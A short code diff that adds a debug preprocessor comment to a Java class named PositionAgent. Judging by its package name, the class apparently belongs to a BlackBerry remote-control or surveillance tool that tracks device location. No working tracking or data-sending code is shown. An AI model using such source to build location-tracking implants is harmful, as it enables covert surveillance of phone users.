@@ -4,6 +4,7 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public class PositionAgent extends Agent {
+	//#debug
     static Debug debug = new Debug("PositionAgent", DebugLevel.VERBOSE);
 
     public PositionAgent(boolean agentStatus) {
